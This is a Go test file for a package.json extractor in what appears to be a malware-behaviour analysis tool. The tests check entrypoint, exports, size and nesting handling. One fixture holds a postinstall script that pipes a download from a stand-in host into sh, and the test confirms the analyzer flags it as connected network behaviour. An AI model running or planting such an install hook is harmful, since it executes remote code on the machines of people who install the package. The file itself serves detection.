package extract

import (
	"fmt"
	"reflect"
	"strings"
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
)

func TestNodePackageManifestFeaturesRetainExactDeclarations(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{
		NodeID:       "node-package",
		ScopeID:      "scope-package",
		LogicalPath:  "fixture.zip!package.json",
		PhysicalPath: "/private/fixture.zip",
		Data: []byte(`{
  "name":"@scope/example",
  "version":"1.2.3-beta.1",
  "type":"module",
  "main":"dist/main.js",
  "exports":"./dist/index.js"
}`),
	}
	ExtractPackageHooks(&graph, content)

	want := []struct {
		key, value, field, evidenceKind string
	}{
		{key: "package.name", value: "@scope/example", evidenceKind: "package-name"},
		{key: "package.version", value: "1.2.3-beta.1", evidenceKind: "package-version"},
		{key: "node.package.type", value: "module", evidenceKind: "node-package-type"},
		{key: "node.package.entrypoint", value: "dist/main.js", field: "main", evidenceKind: "node-package-main-entrypoint"},
		{key: "node.package.entrypoint", value: "./dist/index.js", field: "exports", evidenceKind: "node-package-exports-entrypoint"},
	}
	if len(graph.Features) != len(want) || len(graph.Evidence) != len(want) {
		t.Fatalf("manifest facts = %d features/%d evidence, want %d/%d: features=%#v evidence=%#v", len(graph.Features), len(graph.Evidence), len(want), len(want), graph.Features, graph.Evidence)
	}
	evidenceByID := make(map[string]behavior.Evidence, len(graph.Evidence))
	for _, evidence := range graph.Evidence {
		evidenceByID[evidence.ID] = evidence
	}
	for index, expected := range want {
		feature := graph.Features[index]
		if feature.Key != expected.key || feature.Value != expected.value || feature.Qualifiers["field"] != expected.field {
			t.Fatalf("manifest feature %d = %#v, want %+v", index, feature, expected)
		}
		if feature.Support != behavior.SupportDirect || feature.Execution.Connectivity != behavior.ConnectivityUnknown ||
			len(feature.Execution.ExecutionRootIDs) != 0 || len(feature.Execution.InvokedTargetIDs) != 0 || len(feature.EvidenceIDs) != 1 {
			t.Fatalf("manifest declaration gained execution ownership or lost direct evidence: %#v", feature)
		}
		evidence := evidenceByID[feature.EvidenceIDs[0]]
		if evidence.NodeID != content.NodeID || evidence.ScopeID != content.ScopeID ||
			evidence.Logical != content.LogicalPath || evidence.Physical != content.PhysicalPath ||
			evidence.Method != "package.json" || evidence.Kind != expected.evidenceKind || evidence.Value != expected.value {
			t.Fatalf("manifest evidence = %#v, want exact origin and value for %+v", evidence, expected)
		}
	}
	if len(graph.ExecutionRoots) != 0 || len(graph.InvokedTargets) != 0 || len(graph.Operations) != 0 || len(graph.Relations) != 0 || len(graph.Network) != 0 {
		t.Fatalf("metadata-only manifest created execution behavior: roots=%#v targets=%#v operations=%#v relations=%#v network=%#v", graph.ExecutionRoots, graph.InvokedTargets, graph.Operations, graph.Relations, graph.Network)
	}
}

func TestNodePackageManifestUsesExactFieldCasing(t *testing.T) {
	var graph behavior.Graph
	ExtractPackageHooks(&graph, artifact.Content{
		NodeID:      "node-package",
		LogicalPath: "package.json",
		Data: []byte(`{
  "Name":"decoy-name","name":"real-name",
  "Version":"9.9.9","version":"1.0.0",
  "Type":"commonjs","type":"module",
  "Main":"decoy.js","main":"main.js",
  "Exports":"./decoy.js","exports":"./real.js"
}`),
	})

	values := make([]string, 0, len(graph.Features))
	for _, feature := range graph.Features {
		values = append(values, feature.Value)
	}
	want := []string{"real-name", "1.0.0", "module", "main.js", "./real.js"}
	if !reflect.DeepEqual(values, want) {
		t.Fatalf("case-folded package fields affected facts: got %#v, want %#v", values, want)
	}
}

func TestNodePackageManifestUnsupportedExportsShapesAreExplicitAndLocal(t *testing.T) {
	for _, test := range []struct {
		name, exports, detail string
	}{
		{name: "array", exports: `["./index.js"]`, detail: "unsupported array shape"},
		{name: "boolean", exports: `true`, detail: "unsupported boolean shape"},
		{name: "number", exports: `42`, detail: "unsupported number shape"},
		{name: "conditional root", exports: `{"import":"./index.js"}`, detail: "conditional root object"},
		{name: "nested root target", exports: `{".":{"import":"./index.js"}}`, detail: `root "." export uses an unsupported object target`},
		{name: "mixed keys", exports: `{".":"./index.js","import":"./other.js"}`, detail: "mixes subpath and condition keys"},
	} {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			ExtractPackageHooks(&graph, artifact.Content{
				NodeID:      "node-package",
				LogicalPath: "package.json",
				Data:        []byte(`{"name":"kept","dependencies":{"also-kept":"1.0.0"},"scripts":{"postinstall":"echo kept"},"exports":` + test.exports + `}`),
			})

			if !hasFeatureWithValue(graph.Features, "package.name", "kept") ||
				!hasFeatureWithValue(graph.Features, "package.dependency", "also-kept") ||
				!hasFeatureWithValue(graph.Features, "package.script", "echo kept") || len(graph.ExecutionRoots) != 1 {
				t.Fatalf("unsupported exports poisoned supported siblings: %#v", graph.Features)
			}
			if hasFeatureKey(graph.Features, "node.package.entrypoint") {
				t.Fatalf("unsupported exports became an entrypoint: %#v", graph.Features)
			}
			if countCoverageContaining(graph.Coverage, nodePackageManifestAnalysisArea, test.detail) != 1 {
				t.Fatalf("unsupported exports shape lacks one exact partial marker: %#v", graph.Coverage)
			}
		})
	}
}

func TestNodePackageManifestRetainsExactRootObjectExport(t *testing.T) {
	var graph behavior.Graph
	ExtractPackageHooks(&graph, artifact.Content{
		NodeID:      "node-package",
		LogicalPath: "package.json",
		Data:        []byte(`{"name":"example","exports":{".":"./dist/index.js","./feature":"./dist/feature.js"}}`),
	})
	if !hasFeatureWithValue(graph.Features, "node.package.entrypoint", "./dist/index.js") || len(graph.Coverage) != 0 {
		t.Fatalf("exact root object export was not retained cleanly: features=%#v coverage=%#v", graph.Features, graph.Coverage)
	}
}

func TestNodePackageManifestNullExportDeclaresNoEntrypointOrPartial(t *testing.T) {
	var graph behavior.Graph
	ExtractPackageHooks(&graph, artifact.Content{
		NodeID:      "node-package",
		LogicalPath: "package.json",
		Data:        []byte(`{"name":"example","exports":null}`),
	})
	if hasFeatureKey(graph.Features, "node.package.entrypoint") || len(graph.Coverage) != 0 {
		t.Fatalf("null exports should declare no target and require no partial marker: features=%#v coverage=%#v", graph.Features, graph.Coverage)
	}
}

func TestNodePackageManifestEmptyExportIsExplicitlyPartial(t *testing.T) {
	var graph behavior.Graph
	ExtractPackageHooks(&graph, artifact.Content{NodeID: "node-package", LogicalPath: "package.json", Data: []byte(`{"name":"kept","exports":""}`)})
	if !hasFeatureWithValue(graph.Features, "package.name", "kept") || hasFeatureKey(graph.Features, "node.package.entrypoint") {
		t.Fatalf("empty export handling changed supported facts: %#v", graph.Features)
	}
	if countCoverageContaining(graph.Coverage, nodePackageManifestAnalysisArea, "exports declaration is empty") != 1 {
		t.Fatalf("empty exports lacks one partial marker: %#v", graph.Coverage)
	}
}

func TestNodePackageManifestScalarFactsAreIndependentlyBounded(t *testing.T) {
	oversized := strings.Repeat("x", maxNodePackageManifestFeatureBytes+1)
	data := fmt.Sprintf(`{"name":%q,"version":%q,"type":%q,"main":%q,"exports":%q}`, oversized, oversized, oversized, oversized, oversized)
	var graph behavior.Graph
	ExtractPackageHooks(&graph, artifact.Content{NodeID: "node-package", LogicalPath: "package.json", Data: []byte(data)})

	if len(graph.Features) != 0 || len(graph.Evidence) != 0 {
		t.Fatalf("oversized manifest scalars consumed graph facts: features=%#v evidence=%#v", graph.Features, graph.Evidence)
	}
	for _, field := range []string{"name", "version", "type", "main", "exports"} {
		if countCoverageContaining(graph.Coverage, nodePackageManifestAnalysisArea, "package "+field+" declaration exceeds") != 1 {
			t.Errorf("oversized %s declaration lacks stable partial coverage: %#v", field, graph.Coverage)
		}
	}
	if len(graph.Coverage) != 5 {
		t.Fatalf("oversized scalar coverage = %d records, want 5: %#v", len(graph.Coverage), graph.Coverage)
	}
}

func TestNodePackageManifestConditionalExportsCardinalityIsBounded(t *testing.T) {
	var manifest strings.Builder
	manifest.WriteString(`{"name":"kept","exports":{`)
	for index := 0; index < 4000; index++ {
		if index > 0 {
			manifest.WriteByte(',')
		}
		fmt.Fprintf(&manifest, `"condition-%04d":"./dist/path-%04d.js"`, index, index)
	}
	manifest.WriteString(`}}`)

	extract := func() behavior.Graph {
		var graph behavior.Graph
		ExtractPackageHooks(&graph, artifact.Content{NodeID: "node-package", LogicalPath: "package.json", Data: []byte(manifest.String())})
		return graph
	}
	first, second := extract(), extract()
	if len(first.Features) != 1 || len(first.Evidence) != 1 || len(first.Coverage) != 1 ||
		!hasFeatureWithValue(first.Features, "package.name", "kept") ||
		countCoverageContaining(first.Coverage, nodePackageManifestAnalysisArea, "conditional root object") != 1 {
		t.Fatalf("object exports cardinality expanded retained facts: features=%d evidence=%d coverage=%#v", len(first.Features), len(first.Evidence), first.Coverage)
	}
	if !reflect.DeepEqual(first.Features, second.Features) || !reflect.DeepEqual(first.Evidence, second.Evidence) || !reflect.DeepEqual(first.Coverage, second.Coverage) {
		t.Fatal("bounded unsupported exports handling is not deterministic")
	}
}

func TestNodePackageManifestMalformedAndDeepDocumentsFailClosed(t *testing.T) {
	t.Run("malformed typed field", func(t *testing.T) {
		var graph behavior.Graph
		ExtractPackageHooks(&graph, artifact.Content{
			NodeID:      "node-package",
			LogicalPath: "package.json",
			Data:        []byte(`{"name":"must-not-survive","version":{"nested":"value"}}`),
		})
		if len(graph.Features) != 0 || len(graph.Evidence) != 0 || !hasPartialCoverageScope(graph.Coverage, "package-json") {
			t.Fatalf("malformed manifest produced partial facts or lost decode coverage: features=%#v evidence=%#v coverage=%#v", graph.Features, graph.Evidence, graph.Coverage)
		}
	})

	t.Run("nesting limit", func(t *testing.T) {
		data := `{"name":"must-not-survive","exports":` + strings.Repeat(`[`, maxPackageJSONDepth) + `"./index.js"` + strings.Repeat(`]`, maxPackageJSONDepth) + `}`
		var graph behavior.Graph
		ExtractPackageHooks(&graph, artifact.Content{NodeID: "node-package", LogicalPath: "package.json", Data: []byte(data)})
		if len(graph.Features) != 0 || len(graph.Evidence) != 0 || countCoverageContaining(graph.Coverage, "package-json", "JSON nesting limit") != 1 {
			t.Fatalf("deep manifest did not fail closed at preflight: features=%#v evidence=%#v coverage=%#v", graph.Features, graph.Evidence, graph.Coverage)
		}
	})
}

func TestNodePackageManifestFeaturesNeverInheritNodeExecution(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{
		NodeID:      "node-package",
		LogicalPath: "package.json",
		Data:        []byte(`{"name":"example","version":"1.0.0","type":"module","main":"main.js","exports":"./index.js","scripts":{"postinstall":"echo install"}}`),
	}
	ExtractPackageHooks(&graph, content)
	if len(graph.ExecutionRoots) != 1 {
		t.Fatalf("fixture lifecycle root count = %d, want 1", len(graph.ExecutionRoots))
	}
	promoteNodeExecution(&graph, map[string]behavior.ExecutionContext{
		content.NodeID: connectedExecutionContext([]string{graph.ExecutionRoots[0].ID}, nil),
	})
	seen := 0
	for _, feature := range graph.Features {
		if !isNodePackageManifestFeature(feature.Key) {
			continue
		}
		seen++
		if feature.Execution.Connectivity != behavior.ConnectivityUnknown || len(feature.Execution.ExecutionRootIDs) != 0 || len(feature.Execution.InvokedTargetIDs) != 0 {
			t.Fatalf("manifest declaration inherited lifecycle execution: %#v", feature)
		}
	}
	if seen != 5 {
		t.Fatalf("metadata features seen = %d, want 5: %#v", seen, graph.Features)
	}
}

func TestNodePackageManifestInventoryDoesNotPreemptLifecycleAnalysis(t *testing.T) {
	graph := behavior.Graph{EvidenceLimit: 5}
	ExtractPackageHooks(&graph, artifact.Content{
		NodeID:      "node-package",
		LogicalPath: "package.json",
		Data: []byte(`{
  "name":"example","version":"1.0.0","type":"module","main":"main.js","exports":"./index.js",
  "scripts":{"postinstall":"curl https://priority.example/payload | sh"},
  "dependencies":{"inventory-only":"1.0.0"}
}`),
	})

	if len(graph.ExecutionRoots) != 1 || graph.ExecutionRoots[0].Kind != "npm-script" {
		t.Fatalf("observational manifest facts preempted the lifecycle root: %#v", graph.ExecutionRoots)
	}
	var lifecycleFeatureConnected bool
	for _, feature := range graph.Features {
		if feature.Key == "package.script" && feature.Qualifiers["name"] == "postinstall" {
			lifecycleFeatureConnected = feature.Execution.Connectivity == behavior.ConnectivityConnected
		}
	}
	if !lifecycleFeatureConnected {
		t.Fatalf("observational manifest facts preempted the lifecycle declaration: %#v", graph.Features)
	}
	var networkOperationConnected bool
	for _, operation := range graph.Operations {
		if operation.Kind == behavior.OperationNetworkDownload && operation.Execution.Connectivity == behavior.ConnectivityConnected {
			networkOperationConnected = true
		}
	}
	if !networkOperationConnected {
		t.Fatalf("observational manifest facts preempted connected shell behavior: %#v", graph.Operations)
	}
	if graph.EvidenceLimitDrops == 0 {
		t.Fatal("tight-budget fixture did not exercise evidence exhaustion")
	}
}

func TestNodePackageManifestFeatureOrderIgnoresJSONObjectOrder(t *testing.T) {
	extract := func(data string) behavior.Graph {
		var graph behavior.Graph
		ExtractPackageHooks(&graph, artifact.Content{NodeID: "node-package", LogicalPath: "package.json", Data: []byte(data)})
		return graph
	}
	first := extract(`{"name":"example","version":"1.0.0","type":"module","main":"main.js","exports":"./index.js"}`)
	second := extract(`{"exports":"./index.js","main":"main.js","type":"module","version":"1.0.0","name":"example"}`)
	if !reflect.DeepEqual(first.Features, second.Features) || !reflect.DeepEqual(first.Evidence, second.Evidence) || !reflect.DeepEqual(first.Coverage, second.Coverage) {
		t.Fatalf("manifest declaration order changed output:\nfirst=%#v\nsecond=%#v", first, second)
	}
}

func hasFeatureKey(features []behavior.Feature, key string) bool {
	for _, feature := range features {
		if feature.Key == key {
			return true
		}
	}
	return false
}

func hasFeatureWithValue(features []behavior.Feature, key, value string) bool {
	for _, feature := range features {
		if feature.Key == key && feature.Value == value {
			return true
		}
	}
	return false
}

func countCoverageContaining(coverage []behavior.Coverage, area, detail string) int {
	count := 0
	for _, item := range coverage {
		if item.AnalysisArea == area && item.Status == "partial" && strings.Contains(item.Detail, detail) {
			count++
		}
	}
	return count
}

func isNodePackageManifestFeature(key string) bool {
	switch key {
	case "package.name", "package.version", "node.package.type", "node.package.entrypoint":
		return true
	default:
		return false
	}
}
